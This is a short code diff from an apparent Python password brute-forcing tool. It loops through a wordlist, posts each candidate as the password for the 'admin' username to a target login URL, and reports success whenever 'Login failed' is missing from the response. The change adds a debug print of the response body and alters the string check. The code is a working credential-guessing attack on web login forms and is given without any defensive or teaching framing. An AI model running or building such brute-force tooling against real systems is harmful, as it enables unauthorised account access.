@@ -111,7 +111,8 @@ class brute_force:
                 bf.single_password = line.strip()
                 data_to_send = {"username" : "admin" , "password" : bf.single_password}
                 response = requests.post(bf.target,data=data_to_send)
-                if "Login failed" not in response.text:
+                print(response.content)
+                if "Login failed" not in str(response.content):
                     print("[+] Password found --->" + bf.single_password)
     def init_main(bf):
         '''
